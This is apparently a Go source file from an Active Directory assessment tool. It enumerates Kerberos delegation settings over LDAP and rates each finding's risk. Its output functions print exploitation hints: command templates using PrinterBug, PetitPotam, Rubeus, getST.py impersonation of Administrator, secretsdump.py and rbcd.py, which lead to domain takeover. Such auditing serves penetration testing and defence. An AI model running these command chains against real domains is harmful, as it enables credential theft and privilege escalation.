package analysis

import (
	"fmt"
	"strconv"
	"strings"

	"github.com/fatih/color"

	adldap "github.com/YakinAnd/adpath/internal/ldap"
)

// ============================================================
// Моделі даних
// ============================================================

type DelegationType string

const (
	DelegationUnconstrained DelegationType = "Unconstrained"
	DelegationConstrained   DelegationType = "Constrained"
	DelegationRBCD          DelegationType = "Resource-Based Constrained"
)

type DelegationFinding struct {
	SAMAccountName  string
	DN              string
	ObjectType      string
	DelegationType  DelegationType
	AllowedServices []string
	AllowedTo       []string
	IsHighRisk      bool
	RiskReason      string
}

type DelegationResult struct {
	Domain   string
	Findings []DelegationFinding
}

// ============================================================
// LDAP фільтри
// ============================================================

const (
	FilterUnconstrainedUsers = "(&(objectClass=user)" +
		"(userAccountControl:1.2.840.113556.1.4.803:=524288)" +
		"(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))"

	FilterUnconstrainedComputers = "(&(objectClass=computer)" +
		"(userAccountControl:1.2.840.113556.1.4.803:=524288)" +
		"(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))"

	FilterConstrainedDelegation = "(&(|(objectClass=user)(objectClass=computer))" +
		"(msDS-AllowedToDelegateTo=*))"

	FilterRBCD = "(&(|(objectClass=user)(objectClass=computer))" +
		"(msDS-AllowedToActOnBehalfOfOtherIdentity=*))"
)

var delegationAttributes = []string{
	"distinguishedName",
	"sAMAccountName",
	"objectClass",
	"userAccountControl",
	"msDS-AllowedToDelegateTo",
	"msDS-AllowedToActOnBehalfOfOtherIdentity",
}

// ============================================================
// Основна функція
// ============================================================

func AnalyzeDelegation(client *adldap.Client) (*DelegationResult, error) {
	result := &DelegationResult{
		Domain: client.GetDomain(),
	}

	color.Blue("\n[*] Analyzing delegation configurations...")

	if err := findUnconstrainedUsers(client, result); err != nil {
		return nil, err
	}
	if err := findUnconstrainedComputers(client, result); err != nil {
		return nil, err
	}
	if err := findConstrainedDelegation(client, result); err != nil {
		return nil, err
	}
	if err := findRBCD(client, result); err != nil {
		return nil, err
	}

	color.Green("[+] Found %d delegation findings", len(result.Findings))
	return result, nil
}

// ============================================================
// Пошук Unconstrained
// ============================================================

func findUnconstrainedUsers(client *adldap.Client, result *DelegationResult) error {
	entries, err := client.Search(FilterUnconstrainedUsers, delegationAttributes)
	if err != nil {
		return fmt.Errorf("unconstrained user search failed: %w", err)
	}
	for _, entry := range entries {
		result.Findings = append(result.Findings, DelegationFinding{
			SAMAccountName: entry.GetAttributeValue("sAMAccountName"),
			DN:             entry.DN,
			ObjectType:     "user",
			DelegationType: DelegationUnconstrained,
			IsHighRisk:     true,
			RiskReason:     "User account with unconstrained delegation — any connecting user's TGT is cached",
		})
	}
	return nil
}

func findUnconstrainedComputers(client *adldap.Client, result *DelegationResult) error {
	entries, err := client.Search(FilterUnconstrainedComputers, delegationAttributes)
	if err != nil {
		return fmt.Errorf("unconstrained computer search failed: %w", err)
	}
	for _, entry := range entries {
		result.Findings = append(result.Findings, DelegationFinding{
			SAMAccountName: entry.GetAttributeValue("sAMAccountName"),
			DN:             entry.DN,
			ObjectType:     "computer",
			DelegationType: DelegationUnconstrained,
			IsHighRisk:     true,
			RiskReason:     "Computer with unconstrained delegation — compromise leads to TGT harvesting (PrinterBug, PetitPotam)",
		})
	}
	return nil
}

// ============================================================
// Пошук Constrained
// ============================================================

func findConstrainedDelegation(client *adldap.Client, result *DelegationResult) error {
	entries, err := client.Search(FilterConstrainedDelegation, delegationAttributes)
	if err != nil {
		return fmt.Errorf("constrained delegation search failed: %w", err)
	}
	for _, entry := range entries {
		allowedTo := entry.GetAttributeValues("msDS-AllowedToDelegateTo")
		objectType := getObjectTypeFromEntry(entry)
		isHighRisk, riskReason := assessConstrainedRisk(allowedTo)

		uac := delegParseUAC(entry.GetAttributeValue("userAccountControl"))
		if delegIsBitSet(uac, 0x1000000) {
			isHighRisk = true
			riskReason = "Protocol Transition enabled (S4U2Self) — can impersonate any user"
		}

		result.Findings = append(result.Findings, DelegationFinding{
			SAMAccountName:  entry.GetAttributeValue("sAMAccountName"),
			DN:              entry.DN,
			ObjectType:      objectType,
			DelegationType:  DelegationConstrained,
			AllowedServices: allowedTo,
			IsHighRisk:      isHighRisk,
			RiskReason:      riskReason,
		})
	}
	return nil
}

func assessConstrainedRisk(allowedServices []string) (bool, string) {
	criticalServices := []string{"ldap/", "cifs/", "host/", "http/", "krbtgt", "dc", "domain controller"}
	for _, svc := range allowedServices {
		svcLower := strings.ToLower(svc)
		for _, critical := range criticalServices {
			if strings.Contains(svcLower, critical) {
				return true, fmt.Sprintf("Delegation allowed to critical service: %s", svc)
			}
		}
	}
	return false, ""
}

// ============================================================
// Пошук RBCD
// ============================================================

func findRBCD(client *adldap.Client, result *DelegationResult) error {
	entries, err := client.Search(FilterRBCD, delegationAttributes)
	if err != nil {
		return fmt.Errorf("RBCD search failed: %w", err)
	}
	for _, entry := range entries {
		result.Findings = append(result.Findings, DelegationFinding{
			SAMAccountName: entry.GetAttributeValue("sAMAccountName"),
			DN:             entry.DN,
			ObjectType:     getObjectTypeFromEntry(entry),
			DelegationType: DelegationRBCD,
			IsHighRisk:     true,
			RiskReason:     "RBCD configured — check who can delegate to this object (potential privilege escalation)",
		})
	}
	return nil
}

// ============================================================
// Вивід
// ============================================================

func PrintDelegationResult(dr *DelegationResult) {
	if len(dr.Findings) == 0 {
		color.Green("[+] No dangerous delegation configurations found")
		return
	}

	unconstrained := filterByDelegationType(dr.Findings, DelegationUnconstrained)
	constrained := filterByDelegationType(dr.Findings, DelegationConstrained)
	rbcd := filterByDelegationType(dr.Findings, DelegationRBCD)

	if len(unconstrained) > 0 {
		color.Red("\n[!] Unconstrained Delegation (%d) — CRITICAL:\n", len(unconstrained))
		for _, f := range unconstrained {
			printDelegationFinding(f)
		}
		printUnconstrainedExploitHints(dr.Domain)
	}

	if len(constrained) > 0 {
		color.Yellow("\n[!] Constrained Delegation (%d):\n", len(constrained))
		for _, f := range constrained {
			printDelegationFinding(f)
			if len(f.AllowedServices) > 0 {
				color.White("      Allowed services:")
				for _, svc := range f.AllowedServices {
					color.Cyan("        - %s", svc)
				}
			}
		}
		printConstrainedExploitHints(dr.Domain)
	}

	if len(rbcd) > 0 {
		color.Yellow("\n[!] Resource-Based Constrained Delegation (%d):\n", len(rbcd))
		for _, f := range rbcd {
			printDelegationFinding(f)
		}
		printRBCDExploitHints(dr.Domain)
	}
}

func printDelegationFinding(f DelegationFinding) {
	icon := "🟠"
	if f.IsHighRisk {
		icon = "🔴"
	}
	color.White("\n  %s [%s] %s", icon, strings.ToUpper(f.ObjectType), f.SAMAccountName)
	color.White("      DN:   %s", f.DN)
	color.White("      Type: %s", f.DelegationType)
	if f.RiskReason != "" {
		color.Red("      Risk: %s", f.RiskReason)
	}
}

func printUnconstrainedExploitHints(domain string) {
	color.Cyan("\n[*] Exploitation hints (Unconstrained Delegation):")
	color.White("  1. Trigger authentication from DC to vulnerable host:")
	color.White("     printerbug.py %s/<user>:<pass>@<DC-IP> <vuln-host-IP>", domain)
	color.White("     OR: PetitPotam.py -u <user> -p <pass> <vuln-host-IP> <DC-IP>")
	color.White("  2. Capture TGT on vulnerable host:")
	color.White("     rubeus.exe monitor /interval:1 /nowrap")
	color.White("  3. Pass-The-Ticket → DCSync")
}

func printConstrainedExploitHints(domain string) {
	color.Cyan("\n[*] Exploitation hints (Constrained Delegation):")
	color.White("    getST.py -spn <allowed-spn> -impersonate Administrator %s/<account>:<pass>", domain)
	color.White("    export KRB5CCNAME=Administrator.ccache")
	color.White("    secretsdump.py -k -no-pass %s/Administrator@<target>", domain)
}

func printRBCDExploitHints(domain string) {
	color.Cyan("\n[*] Exploitation hints (RBCD):")
	color.White("    rbcd.py -f <controlled-computer> -t <target> -dc-ip <DC> %s/<user>:<pass>", domain)
	color.White("    getST.py -spn cifs/<target> -impersonate Administrator %s/<controlled-computer>$:<pass>", domain)
}

// ============================================================
// Допоміжні функції
// ============================================================

func filterByDelegationType(findings []DelegationFinding, dt DelegationType) []DelegationFinding {
	var result []DelegationFinding
	for _, f := range findings {
		if f.DelegationType == dt {
			result = append(result, f)
		}
	}
	return result
}

func getObjectTypeFromEntry(entry interface{ GetAttributeValues(string) []string }) string {
	for _, c := range entry.GetAttributeValues("objectClass") {
		if strings.ToLower(c) == "computer" {
			return "computer"
		}
	}
	return "user"
}

func delegParseUAC(val string) uint64 {
	if val == "" {
		return 0
	}
	n, _ := strconv.ParseUint(val, 10, 64)
	return n
}

func delegIsBitSet(uac uint64, bit uint64) bool {
	return uac&bit != 0
}